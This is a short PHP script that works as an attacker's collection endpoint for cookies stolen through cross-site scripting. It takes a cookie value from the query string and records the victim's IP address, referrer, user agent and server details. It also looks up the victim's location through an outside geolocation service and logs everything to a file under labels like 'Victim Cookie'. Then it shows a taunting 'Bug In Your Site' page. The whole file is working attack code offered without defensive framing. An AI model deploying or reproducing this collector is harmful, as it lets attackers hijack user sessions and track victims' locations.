<?php

/**
 * Get client IP
 *
 * @return string
 */
function getClientIP()
{
    $ipKeys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];

    foreach ($ipKeys as $key) {
        if (isset($_SERVER[$key])) {
            return $_SERVER[$key];
        }
    }

    return 'UNKNOWN';
}

/**
 * Get Geographical details based on IP
 *
 * @param string $ip
 * @return array
 */
function getGeoDetails($ip)
{
    $json = file_get_contents("http://ipinfo.io/$ip/geo");

    // Error handling for file_get_contents
    if ($json === false) {
        return ['country' => 'UNKNOWN', 'region' => 'UNKNOWN', 'city' => 'UNKNOWN'];
    }

    return json_decode($json, true);
}

$cookie = $_GET['cookie'];
$clientIP = getClientIP();
$geoDetails = getGeoDetails($clientIP);

$data = [
    'Victim Cookie' => $cookie,
    'Victim IP' => $clientIP,
    'Victim Comes From' => $_SERVER['HTTP_REFERER'],
    'Victim Details' => $_SERVER['HTTP_USER_AGENT'],
    'Server Name' => $_SERVER['SERVER_NAME'],
    'Server IP' => $_SERVER['SERVER_ADDR'],
    'User Country' => $geoDetails['country'],
    'User Region' => $geoDetails['region'],
    'User City' => $geoDetails['city'],
];

$logEntry = "\n----{Begin}----\n";
foreach ($data as $label => $value) {
    $logEntry .= $label . " => " . $value . "\n";
}
$logEntry .= "------{End}-----";

file_put_contents('Log.txt', $logEntry, FILE_APPEND | LOCK_EX);
?>

<!DOCTYPE html>
<html>
<head>
<title>You Have A Bug In Your Site</title>
</head>
<body>
<center>
<p style='color:red'><b>Bug In Your Site</b></p>
</center>
</body>
</html>
